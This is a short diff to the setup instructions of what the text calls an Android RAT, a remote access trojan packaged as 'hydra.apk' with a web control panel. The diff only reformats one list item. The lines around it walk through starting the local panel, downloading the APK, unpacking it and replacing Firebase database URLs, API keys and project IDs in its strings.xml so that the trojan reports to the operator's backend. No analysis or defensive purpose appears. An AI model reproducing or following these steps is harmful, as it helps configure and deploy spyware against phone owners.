@@ -85,7 +85,7 @@
  1. Edit the Root folder path within the application to the WEB PANEL location
  1. Click START, then click 127.0.0.1 Go to any browser and paste the url And start
  ### Android RAT
- 1. Download [hydra.apk](./ANDROID%20APP/hydra.apk)
+  - Download [hydra.apk](./ANDROID%20APP/hydra.apk)
  1. Unpack or edit the apk using any software recommended above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id`
